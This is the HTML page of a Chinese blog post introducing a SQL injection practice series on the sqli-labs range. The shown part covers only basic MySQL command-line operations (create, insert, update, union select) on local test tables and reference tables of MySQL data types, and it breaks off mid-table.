@@ -1,0 +1,856 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"cnshark.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="随手而记之。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Sql注入-Mysql-Sqli_labs（一）">
+<meta property="og:url" content="https://cnshark.top/2021/08/31/Sql%E6%B3%A8%E5%85%A5-Mysql-Sqli_labs%EF%BC%88%E4%B8%80%EF%BC%89/index.html">
+<meta property="og:site_name" content="dayu&#39;s blog">
+<meta property="og:description" content="随手而记之。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108311423869.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108311423236.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108311423611.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108311423827.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108311423882.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108311423938.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108311423020.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108311423964.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108311424589.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108311424076.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108311424083.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108311424124.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108311424939.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108311424626.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108311424507.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108311424867.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108311424739.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108311424683.png">
+<meta property="article:published_time" content="2021-08-31T06:14:28.000Z">
+<meta property="article:modified_time" content="2021-08-31T06:45:18.201Z">
+<meta property="article:author" content="dayu">
+<meta property="article:tag" content="Sql注入">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108311423869.png">
+
+<link rel="canonical" href="https://cnshark.top/2021/08/31/Sql%E6%B3%A8%E5%85%A5-Mysql-Sqli_labs%EF%BC%88%E4%B8%80%EF%BC%89/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Sql注入-Mysql-Sqli_labs（一） | dayu's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">dayu's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">愿一尺键盘<br>捍卫祖国尊严</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-myold">
+
+    <a href="/old/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>myold</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/icnshark" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://cnshark.top/2021/08/31/Sql%E6%B3%A8%E5%85%A5-Mysql-Sqli_labs%EF%BC%88%E4%B8%80%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/avatar.jpg">
+      <meta itemprop="name" content="dayu">
+      <meta itemprop="description" content="北冥有魚 其名為鯤<br>化而為鳥 其名為鵬">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="dayu's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Sql注入-Mysql-Sqli_labs（一）
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-08-31 14:14:28 / 修改时间：14:45:18" itemprop="dateCreated datePublished" datetime="2021-08-31T14:14:28+08:00">2021-08-31</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>随手而记之。</p>
+<span id="more"></span>
+
+<h4 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h4><p><img src="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108311423869.png" alt="image-20210827141834605"></p>
+<h4 id="学习mysql"><a href="#学习mysql" class="headerlink" title="学习mysql"></a>学习mysql</h4><h5 id="命令行操作mysql"><a href="#命令行操作mysql" class="headerlink" title="命令行操作mysql"></a>命令行操作mysql</h5><p>命令行进入mysql：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\phpstudy_pro\Extensions\MySQL5.<span class="number">7.26</span>\bin&gt; .\mysql.exe <span class="literal">-h</span> localhost <span class="literal">-u</span> root <span class="literal">-p</span></span><br></pre></td></tr></table></figure>
+
+<p>查看所有库：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br></pre></td></tr></table></figure>
+
+<p>进入mysql库：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br></pre></td></tr></table></figure>
+
+<p>查看所有表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show tables;</span><br></pre></td></tr></table></figure>
+
+<p>使用desc来查看user表的所有字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">desc user;</span><br></pre></td></tr></table></figure>
+
+<p>查看user表的user字段，即显示所有用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select user form user;</span><br></pre></td></tr></table></figure>
+
+<p>创建test库：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create database test;</span><br></pre></td></tr></table></figure>
+
+<p>删除test库：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop database test;</span><br></pre></td></tr></table></figure>
+
+<p>新建test表以及id的int字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create table test(id int);</span><br></pre></td></tr></table></figure>
+
+<p>删除test表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop table test;</span><br></pre></td></tr></table></figure>
+
+<p>在test表中插入字段id的值1；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into test (id) values (1);</span><br></pre></td></tr></table></figure>
+
+<p>查询test表的所有数据：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test;</span><br></pre></td></tr></table></figure>
+
+<p>添加test表类型为text的name字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table test add name text;</span><br></pre></td></tr></table></figure>
+
+<p>删除name字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table test drop name;</span><br></pre></td></tr></table></figure>
+
+<p>在test表中插入字段name的值root；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into test (name) values (&quot;root&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>在test表同时插入id，name字段的值1和root：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into test (id,name) values (1,&quot;root&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>查询test表的id字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id from test;</span><br></pre></td></tr></table></figure>
+
+<p>查询test表所有id字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+------+------+</span><br><span class="line">| id   | name |</span><br><span class="line">+------+------+</span><br><span class="line">|    2 | user |</span><br><span class="line">|    1 | root |</span><br><span class="line">+------+------+</span><br></pre></td></tr></table></figure>
+
+<p>查询test表id为1的字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id = 1;</span><br></pre></td></tr></table></figure>
+
+<p>查询test表name为root的字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where name = &quot;root&quot;;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+------+------+</span><br><span class="line">| id   | name |</span><br><span class="line">+------+------+</span><br><span class="line">|    1 | root |</span><br><span class="line">|    3 | ROOT |</span><br><span class="line">+------+------+</span><br></pre></td></tr></table></figure>
+
+<p>发现没有限定大小写，使用binary关键字。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where binary name = &quot;root&quot;;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+------+------+</span><br><span class="line">| id   | name |</span><br><span class="line">+------+------+</span><br><span class="line">|    1 | root |</span><br><span class="line">+------+------+</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from test;</span><br><span class="line">+------+------+----------+</span><br><span class="line">| id   | name | password |</span><br><span class="line">+------+------+----------+</span><br><span class="line">|    1 | root | 123      |</span><br><span class="line">|    2 | user | abc      |</span><br><span class="line">+------+------+----------+</span><br></pre></td></tr></table></figure>
+
+<p>更新test表的id为1的password为yes：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update test set password = &#x27;yes&#x27; where id = 1;</span><br></pre></td></tr></table></figure>
+
+<p>删除test表的id为2的数据：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from test where id = 2;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from test;</span><br><span class="line">+------+------+----------+</span><br><span class="line">| id   | name | password |</span><br><span class="line">+------+------+----------+</span><br><span class="line">|    1 | root | yes      |</span><br><span class="line">|    2 | toor | no       |</span><br><span class="line">+------+------+----------+</span><br></pre></td></tr></table></figure>
+
+<p>查询test表中name包含oo的数据：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where name like &#x27;%oo%&#x27;;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from test;</span><br><span class="line">+------+------+----------+</span><br><span class="line">| id   | name | password |</span><br><span class="line">+------+------+----------+</span><br><span class="line">|    1 | root | yes      |</span><br><span class="line">|    2 | toor | no       |</span><br><span class="line">+------+------+----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from test1;</span><br><span class="line">+------+--------+----------+</span><br><span class="line">| id   | name   | password |</span><br><span class="line">+------+--------+----------+</span><br><span class="line">|    1 | dayu   | ahah     |</span><br><span class="line">|    2 | xiaoyu | haha     |</span><br><span class="line">+------+--------+----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>选取test和test1不同的id：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id from test union select id from test1 order by id;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select id from test union select id from test1 order by id;</span><br><span class="line">+------+</span><br><span class="line">| id   |</span><br><span class="line">+------+</span><br><span class="line">|    1 |</span><br><span class="line">|    2 |</span><br><span class="line">+------+</span><br></pre></td></tr></table></figure>
+
+<p>选取test和test1不同的name：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name from test union select name from test1 order by name;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select name from test union select name from test1;</span><br><span class="line">+--------+</span><br><span class="line">| name   |</span><br><span class="line">+--------+</span><br><span class="line">| root   |</span><br><span class="line">| toor   |</span><br><span class="line">| dayu   |</span><br><span class="line">| xiaoyu |</span><br><span class="line">+--------+</span><br></pre></td></tr></table></figure>
+
+<p>选取test和test1所有的id：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id from test union all select id from test1 order by id;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select id from test union all select id from test1 order by id;</span><br><span class="line">+------+</span><br><span class="line">| id   |</span><br><span class="line">+------+</span><br><span class="line">|    1 |</span><br><span class="line">|    1 |</span><br><span class="line">|    2 |</span><br><span class="line">|    2 |</span><br><span class="line">+------+</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select id,name from test union all select id,name from test1 where name = &quot;root&quot;;</span><br><span class="line">+------+------+</span><br><span class="line">| id   | name |</span><br><span class="line">+------+------+</span><br><span class="line">|    1 | root |</span><br><span class="line">|    2 | toor |</span><br><span class="line">+------+------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select id,name from test1 union all select id,name from test where name = &quot;root&quot;;</span><br><span class="line">+------+--------+</span><br><span class="line">| id   | name   |</span><br><span class="line">+------+--------+</span><br><span class="line">|    1 | dayu   |</span><br><span class="line">|    2 | xiaoyu |</span><br><span class="line">|    1 | root   |</span><br><span class="line">+------+--------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select id,name from test union all select id,name from test1;</span><br><span class="line">+------+--------+</span><br><span class="line">| id   | name   |</span><br><span class="line">+------+--------+</span><br><span class="line">|    1 | root   |</span><br><span class="line">|    2 | toor   |</span><br><span class="line">|    1 | dayu   |</span><br><span class="line">|    2 | xiaoyu |</span><br><span class="line">+------+--------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select id,name from test1 union all select id,name from test;</span><br><span class="line">+------+--------+</span><br><span class="line">| id   | name   |</span><br><span class="line">+------+--------+</span><br><span class="line">|    1 | dayu   |</span><br><span class="line">|    2 | xiaoyu |</span><br><span class="line">|    1 | root   |</span><br><span class="line">|    2 | toor   |</span><br><span class="line">+------+--------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>交换表的位置，where结果不同。</p>
+<h5 id="mysql数据类型"><a href="#mysql数据类型" class="headerlink" title="mysql数据类型"></a>mysql数据类型</h5><p><strong>数值类型</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">类型</th>
+<th align="left">大小</th>
+<th align="left">范围（有符号）</th>
+<th align="left">范围（无符号）</th>
+<th align="left">用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">TINYINT</td>
+<td align="left">1 byte</td>
+<td align="left">(-128，127)</td>
+<td align="left">(0，255)</td>
+<td align="left">小整数值</td>
+</tr>
+<tr>
+<td align="left">SMALLINT</td>
+<td align="left">2 bytes</td>
+<td align="left">(-32 768，32 767)</td>
+<td align="left">(0，65 535)</td>
+<td align="left">大整数值</td>
+</tr>
+<tr>
+<td align="left">MEDIUMINT</td>
+<td align="left">3 bytes</td>
+<td align="left">(-8 388 608，8 388 607)</td>
+<td align="left">(0，16 777 215)</td>
+<td align="left">大整数值</td>
+</tr>
+<tr>
+<td align="left">INT或INTEGER</td>
+<td align="left">4 bytes</td>
+<td align="left">(-2 147 483 648，2 147 483 647)</td>
+<td align="left">(0，4 294 967 295)</td>
+<td align="left">大整数值</td>
+</tr>
+<tr>
+<td align="left">BIGINT</td>
+<td align="left">8 bytes</td>
+<td align="left">(-9,223,372,036,854,775,808，9 223 372 036 854 775 807)</td>
+<td align="left">(0，18 446 744 073 709 551 615)</td>
+<td align="left">极大整数值</td>
+</tr>
+<tr>
+<td align="left">FLOAT</td>
+<td align="left">4 bytes</td>
+<td align="left">(-3.402 823 466 E+38，-1.175 494 351 E-38)，0，(1.175 494 351 E-38，3.402 823 466 351 E+38)</td>
+<td align="left">0，(1.175 494 351 E-38，3.402 823 466 E+38)</td>
+<td align="left">单精度 浮点数值</td>
+</tr>
+<tr>
+<td align="left">DOUBLE</td>
+<td align="left">8 bytes</td>
+<td align="left">(-1.797 693 134 862 315 7 E+308，-2.225 073 858 507 201 4 E-308)，0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)</td>
+<td align="left">0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)</td>
+<td align="left">双精度 浮点数值</td>
+</tr>
+<tr>
+<td align="left">DECIMAL</td>
+<td align="left">对DECIMAL(M,D) ，如果M&gt;D，为M+2否则为D+2</td>
+<td align="left">依赖于M和D的值</td>
+<td align="left">依赖于M和D的值</td>
+<td align="left">小数值</td>
+</tr>
+</tbody></table>
+<p><strong>日期和时间类型</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">类型</th>
+<th align="left">大小 ( bytes)</th>
+<th align="left">范围</th>
+<th align="left">格式</th>
+<th align="left">用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">DATE</td>
+<td align="left">3</td>
+<td align="left">1000-01-01/9999-12-31</td>
+<td align="left">YYYY-MM-DD</td>
+<td align="left">日期值</td>
+</tr>
+<tr>
+<td align="left">TIME</td>
+<td align="left">3</td>
+<td align="left">‘-838:59:59’/‘838:59:59’</td>
+<td align="left">HH:MM:SS</td>
+<td align="left">时间值或持续时间</td>
+</tr>
+<tr>
+<td align="left">YEAR</td>
+<td align="left">1</td>
+<td align="left">1901/2155</td>
+<td align="left">YYYY</td>
+<td align="left">年份值</td>
+</tr>
+<tr>
+<td align="left">DATETIME</td>
+<td align="left">8</td>
+<td align="left">1000-01-01 00:00:00/9999-12-31 23:59:59</td>
+<td align="left">YYYY-MM-DD HH:MM:SS</td>
+<td align="left">混合日期和时间值</td>
+</tr>
+<tr>
+<td align="left">TIMESTAMP</td>
+<td align="left">4</td>
+<td align="left">1970-01-01 00:00:00/2038结束时间是第 <strong>2147483647</strong> 秒，北京时间 <strong>2038-1-19 11:14:07</strong>，格林尼治时间 2038年1月19日 凌晨 03:14:07</td>
+<td align="left">YYYYMMDD HHMMSS</td>
+<td align="left">混合日期和时间值，时间戳</td>
+</tr>
+</tbody></table>
+<p><strong>字符串类型</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">类型</th>
+<th align="left">大小</th>
+<th align="left">用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">CHAR</td>
+<td align="left">0-255 bytes</td>
+<td align="left">定长字符串</td>
+</tr>
+<tr>
+<td align="left">VARCHAR</td>
+<td align="left">0-65535 bytes</td>
+<td align="left">变长字符串</td>
+</tr>
+<tr>
+<td align="left">TINYBLOB</td>
+<td align="left">0-255 bytes</td>
+<td align="left">不超过 255 个字符的二进制字符串</td>
+</tr>
+<tr>
+<td align="left">TINYTEXT</td>
+<td align="left">0-255 bytes</td>
+<td align="left">短文本字符串</td>
+</tr>
+<tr>
+<td align="left">BLOB</td>
+<td align="left">0-65 535 bytes</td>
+<td align="left">二进制形式的长文本数据</td>
+</tr>
+<tr>
+<td align="left">TEXT</td>
+<td align="left">0-65 535 bytes</td>
+<td align="left">长文本数据</td>
+</tr>
+<tr>
+<td align="left">MEDIUMBLOB</td>
+<td align="left">0-16 777 215 bytes</td>
